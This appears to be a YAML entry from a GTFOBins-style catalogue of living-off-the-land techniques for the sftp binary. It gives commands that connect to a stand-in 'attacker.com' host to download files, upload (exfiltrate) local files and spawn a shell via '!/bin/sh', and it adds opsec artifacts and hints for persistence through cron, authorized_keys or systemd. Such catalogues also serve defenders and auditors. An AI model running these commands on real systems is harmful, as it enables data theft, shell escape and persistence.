---
name: sftp
capabilities:
- exec
- spawn
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: |-
    sftp user@attacker.com
    get /path/to/input-file /path/to/output-file
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    sftp user@attacker.com
    !/bin/sh
  notes: This still requires a successfull connection to the server.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: |-
    sftp user@attacker.com
    put /path/to/input-file /path/to/output-file
references:
- https://gtfobins.github.io/gtfobins/sftp/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
